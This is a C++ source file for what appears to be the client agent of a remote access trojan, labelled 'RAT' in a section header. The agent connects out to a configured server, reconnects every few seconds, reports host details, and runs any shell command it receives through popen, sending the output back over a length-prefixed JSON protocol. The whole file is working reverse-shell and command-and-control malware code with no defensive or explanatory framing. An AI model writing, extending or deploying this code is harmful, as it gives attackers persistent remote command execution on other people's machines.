//g++ -std=c++17 c_agent.cpp -o client
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <cstdlib>
#include <cstring>

#include "json.hpp"
using json = nlohmann::json;

#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define popen _popen
#define pclose _pclose
#else
#include <unistd.h>
#include <arpa/inet.h>
#endif

// ================= CONFIG =================
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9999

// ================= SOCKET =================
void init_socket() {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif
}

void close_socket(int sock) {
#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
}

// ================= RAT SOCKET =================

bool send_packet(int sock, const json& j) {
    std::string body = j.dump();

    uint32_t len = body.size();
    char header[4];
    header[0] = len & 0xFF;
    header[1] = (len >> 8) & 0xFF;
    header[2] = (len >> 16) & 0xFF;
    header[3] = (len >> 24) & 0xFF;

    if (send(sock, header, 4, 0) != 4) return false;
    if (send(sock, body.c_str(), body.size(), 0) != (int)body.size()) return false;
    return true;
}

bool recv_all(int sock, char* buf, int len) {
    int rec = 0;
    while (rec < len) {
        int r = recv(sock, buf + rec, len - rec, 0);
        if (r <= 0) return false;
        rec += r;
    }
    return true;
}

bool recv_packet(int sock, json& out) {
    char header[4];
    if (!recv_all(sock, header, 4)) return false;

    uint32_t len =
        (unsigned char)header[0] |
        ((unsigned char)header[1] << 8) |
        ((unsigned char)header[2] << 16) |
        ((unsigned char)header[3] << 24);

    std::vector<char> body(len);
    if (!recv_all(sock, body.data(), len)) return false;

    try {
        out = json::parse(body);
    } catch (...) {
        return false;
    }
    return true;
}

// ================= SYSTEM =================

std::string exec_cmd(const std::string& cmd, const std::string& cwd) {
    std::string result;
    char buffer[256];

#ifdef _WIN32
    std::string full = "cd /d \"" + cwd + "\" && " + cmd;
    FILE* pipe = _popen(full.c_str(), "r");
#else
    std::string full = "cd \"" + cwd + "\" && " + cmd;
    FILE* pipe = popen(full.c_str(), "r");
#endif

    if (!pipe) return "exec failed";

    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }

#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif

    return result;
}

// ================= SESSION =================

struct Session {
    int sock;
    std::string clientID;
    std::string cwd;
};

std::string get_cwd() {
#ifdef _WIN32
    char buf[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buf);
    return buf;
#else
    char buf[1024];
    getcwd(buf, sizeof(buf));
    return buf;
#endif
}

// ================= DISPATCH =================

std::pair<int,std::string> dispatch(Session& s, const std::string& cmd) {

    std::istringstream iss(cmd);
    std::string name;
    iss >> name;

    std::string args;
    getline(iss, args);

    if (name == "pwd") {
        return {1, s.cwd};
    }

    if (name == "cd") {
        if (args.empty()) return {0, "Usage: cd <path>"};

        std::string path = args.substr(1);
#ifdef _WIN32
        if (_chdir(path.c_str()) == 0)
#else
        if (chdir(path.c_str()) == 0)
#endif
        {
            s.cwd = get_cwd();
            return {1, ""};
        }
        return {0, "cd failed"};
    }

    if (name == "kill") {
        exit(0);
    }

    // fallback shell
    return {1, exec_cmd(cmd, s.cwd)};
}

// ================= CLIENT =================

void run_client() {
    init_socket();

    while (true) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        Session session;
        session.sock = sock;
        session.cwd = get_cwd();
        session.clientID = "cpp-client";

        // ===== INFO（完全一致结构）=====
        json info = {
            {"type","info"},
            {"id",session.clientID},
            {"os_type","cpp"},
            {"os_ver","unknown"},
            {"hostname","cpp-host"},
            {"cwd",session.cwd},
            {"integrity","unknown"},
            {"command_manifest", json::array()},
            {"system_paths", json::array()}
        };

        send_packet(sock, info);

        // ===== LOOP =====
        while (true) {
            json msg;

            if (!recv_packet(sock, msg)) {
                close_socket(sock);
                break;
            }

            std::string type = msg["type"];

            // ===== HEARTBEAT =====
            if (type == "heartbeat") {
                json resp = {
                    {"type","heartbeat_ack"},
                    {"id",msg["id"]},
                    {"client_ts",(long long)time(NULL)},
                    {"cwd",session.cwd}
                };
                send_packet(sock, resp);
            }

            // ===== COMMAND =====
            else if (type == "command") {
                int id = msg["id"];
                std::string text = msg["text"];

                auto res = dispatch(session, text);

                json resp = {
                    {"type","result"},
                    {"id",id},
                    {"status",res.first},
                    {"text",res.second},
                    {"cwd",session.cwd},
                    {"eof",1}
                };

                send_packet(sock, resp);
            }
        }
    }
}

// ================= MAIN =================

int main() {
    run_client();
    return 0;
}